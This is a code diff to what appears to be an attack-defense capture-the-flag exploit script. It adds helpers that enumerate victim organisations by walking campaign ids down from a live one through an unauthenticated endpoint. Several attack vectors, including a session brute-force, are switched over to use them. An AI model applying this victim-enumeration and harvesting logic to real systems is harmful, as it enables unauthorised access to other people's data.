@@ -66,6 +66,11 @@ ADMIN_PROBE_CAP = 32
 #: Victim orgs worked per sweep, per vector. Caps the per-org request loops.
 ORG_CAP = 12
 
+#: How many campaign ids to walk DOWNWARD from a live one. A flag lives 5 ticks
+#: and the checker adds a campaign per tick per team, so a few dozen ids covers
+#: every org whose flag is still worth points.
+RECENT_SPAN = 64
+
 #: Minimum seconds between extension walks for one host. Four vectors share one
 #: discovery cache, so without this the cheap `CAMPAIGN_WALK_STEP` walk would be
 #: paid four times per sweep instead of once.
@@ -303,6 +308,69 @@ def _victims(host, port, timeout, deadline) -> list[str]:
     return sorted(state["orgs"])[:ORG_CAP]
 
 
+def _discover_from_hint(host, port, probe) -> int:
+    """Learn a LIVE campaign id from the flag id's org; returns it, or 0.
+
+    `GET /api/orgs/:slug` is unauthenticated (`campaigns.js:35`) and lists that
+    org's campaigns, so one request yields the org's owner, its lane, and a
+    real campaign id to work from.
+    """
+    hint = _hint_slug()
+    if not hint:
+        return 0
+    state = _target(host)
+    status, data = _get(host, port, "/api/orgs/%s" % _quote(hint), probe)
+    if status != 200 or not isinstance(data, dict):
+        return 0
+    owner = data.get("owner")
+    if isinstance(owner, str) and owner:
+        state["orgs"][hint] = owner
+    top = 0
+    for campaign in data.get("campaigns") or []:
+        if not isinstance(campaign, dict):
+            continue
+        lane = _clean(campaign.get("lane") or "")
+        if lane:
+            state["lanes"].add(lane)
+        cid = str(campaign.get("id") or "")
+        if cid.startswith("c"):
+            try:
+                top = max(top, int(cid[1:], 16))
+            except ValueError:
+                pass
+    return top
+
+
+def _recent_orgs(host, port, probe, deadline, span=RECENT_SPAN) -> list[str]:
+    """Orgs behind the most recent `span` campaign ids.
+
+    The upward walk in `_walk_campaigns` cannot work any more: ids are already
+    past CAMPAIGN_WALK_CAP (c0000010e == 270) and id 1 answers
+    {"error":"missing campaign"}, so it burns the whole budget discovering
+    nothing. Walking DOWN from a live id instead lands on the recent ticks,
+    which is exactly where unexpired flags are -- a flag lives 5 ticks, so old
+    orgs are worthless and new ones are all that matter.
+    """
+    state = _target(host)
+    top = _discover_from_hint(host, port, probe)
+    if not top:
+        return _victims(host, port, probe, deadline)   # fall back to the old walk
+    for cid in range(top, max(0, top - span), -1):
+        if time.monotonic() > deadline:
+            break
+        status, data = _get(host, port, "/api/campaigns/c%08x" % cid, probe)
+        if status == 0:
+            break
+        if status == 200 and isinstance(data, dict):
+            slug = _clean(data.get("org") or "")
+            lane = _clean(data.get("lane") or "")
+            if slug:
+                state["orgs"].setdefault(slug, None)
+            if lane:
+                state["lanes"].add(lane)
+    return sorted(state["orgs"])[:ORG_CAP]
+
+
 # ----------------------------------------------------------------- harvest
 
 
@@ -374,7 +442,7 @@ def v_ledger_window(host, port, timeout=DEFAULT_TIMEOUT):
             covered.add(hint)
         found.extend(_notes(data, "entries"))
 
-    slugs = _victims(host, port, timeout, deadline)
+    slugs = _recent_orgs(host, port, probe, deadline)
 
     # Primary form: org-scoped window, lane empty -> fold("<slug>:").
     for slug in slugs:
@@ -432,7 +500,7 @@ def v_org_archive(host, port, timeout=DEFAULT_TIMEOUT):
             )
             found.extend(_notes(archive, "archive"))
 
-    _victims(host, port, timeout, deadline)
+    _recent_orgs(host, port, probe, deadline)
     state = _fill_owners(host, port, timeout, deadline)
     for slug in sorted(state["orgs"])[:ORG_CAP]:
         owner = state["orgs"][slug]
@@ -462,7 +530,7 @@ def v_session_bruteforce(host, port, timeout=DEFAULT_TIMEOUT):
         return []
     deadline = _budget(timeout)
     state = _target(host)
-    slugs = _victims(host, port, timeout, deadline)
+    slugs = _recent_orgs(host, port, min(timeout, PROBE_TIMEOUT), deadline)
     probe = min(timeout, PROBE_TIMEOUT)
 
     # Fresh throwaway credentials every call.
@@ -582,7 +650,7 @@ def v_handoff(host, port, timeout=DEFAULT_TIMEOUT):
     if not _fingerprint(host, port, timeout):
         return []
     deadline = _budget(timeout)
-    slugs = _victims(host, port, timeout, deadline)
+    slugs = _recent_orgs(host, port, min(timeout, PROBE_TIMEOUT), deadline)
     if not slugs:
         return []
     probe = min(timeout, PROBE_TIMEOUT)
